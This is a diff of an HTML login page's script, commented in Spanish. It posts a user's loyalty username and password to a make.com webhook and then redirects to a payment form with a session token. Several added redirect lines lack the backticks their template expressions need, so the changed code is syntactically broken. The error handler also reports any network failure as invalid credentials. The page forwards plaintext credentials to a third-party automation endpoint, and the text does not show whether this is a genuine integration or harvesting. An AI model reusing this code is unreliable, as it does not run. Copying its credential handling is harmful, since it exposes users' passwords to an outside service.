@@ -85,7 +85,7 @@
       <button type="submit" id="continueBtn">Continue</button>
     </div>
   </form>
-  <div id="loading">Procesando...</div>
+  <div id="loading">Wait...</div>
 </div>
 
 <script>
@@ -98,9 +98,24 @@
   const loading = document.getElementById('loading');
   const skipBtn = document.getElementById('skipBtn');
 
-  // Función común para enviar webhook y redirigir
-  function sendAndRedirect(data) {
+  // Si hacen Skip Login, redirigimos sin token
+  skipBtn.addEventListener('click', () => {
+    window.location.href = form-pago.html?token=&amount=${encodeURIComponent(amount)};
+  });
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
     loading.style.display = 'flex';
+
+    const user = document.getElementById('loyaltyUser').value.trim();
+    const pass = document.getElementById('loyaltyPass').value.trim();
+
+    const data = {
+      loyaltyUser: user,
+      loyaltyPass: pass,
+      amount: amount
+    };
+
     fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -109,34 +124,24 @@
     .then(res => res.json())
     .then(result => {
       loading.style.display = 'none';
-      // Si hubo error real de login, avisamos
-      const intentóLogin = data.loyaltyUser !== '' && data.loyaltyPass !== '';
-      if (result.ExtendedResultCode !== 0 && intentóLogin) {
+
+      const intentóLogin = user !== '' && pass !== '';
+
+      if (result.ExtendedResultCode === 0) {
+        const token = result.LoyaltySessionToken || '';
+        window.location.href = form-pago.html?token=${encodeURIComponent(token)}&amount=${encodeURIComponent(amount)};
+      } else if (intentóLogin) {
         alert(result.ErrorDescription || 'Invalid credentials.');
+      } else {
+        // Si por alguna razón no intentó login pero ExtendedResultCode ≠ 0
+        window.location.href = form-pago.html?token=&amount=${encodeURIComponent(amount)};
       }
-      // Siempre redirigimos, usando token si hay
-      const token = (result.ExtendedResultCode === 0) ? (result.LoyaltySessionToken || '') : '';
-      window.location.href = `form-pago.html?token=${encodeURIComponent(token)}&amount=${encodeURIComponent(amount)}`;
     })
     .catch(err => {
-      loading.style.display = 'none';
       console.error('Error enviando los datos:', err);
-      // Aun en fallo de red, redirigimos sin token
-      window.location.href = `form-pago.html?token=&amount=${encodeURIComponent(amount)}`;
+      loading.style.display = 'none';
+      alert('Invalid credentials.');
     });
-  }
-
-  // Skip Login: enviamos solo amount y vacíos de login
-  skipBtn.addEventListener('click', () => {
-    sendAndRedirect({ loyaltyUser: '', loyaltyPass: '', amount });
-  });
-
-  // Continue: enviamos lo ingresado
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
-    const user = document.getElementById('loyaltyUser').value.trim();
-    const pass = document.getElementById('loyaltyPass').value.trim();
-    sendAndRedirect({ loyaltyUser: user, loyaltyPass: pass, amount });
   });
 </script>
 
